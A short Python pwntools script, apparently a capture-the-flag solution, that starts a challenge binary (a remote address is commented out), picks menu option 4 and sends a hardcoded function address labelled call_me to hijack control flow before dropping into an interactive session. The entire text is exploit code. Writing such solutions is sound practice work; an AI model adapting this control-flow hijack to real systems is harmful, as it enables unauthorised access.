from pwn import *
context(log_level="debug")
#p = remote('128.199.220.74', 10000)
p = process("./1490613578")
call_me = '080484fd'
p.recvuntil("4.Let's pwn it!\n")
p.send("4\n")
p.recvuntil("prefixion\n")
p.send(call_me)
p.interactive()


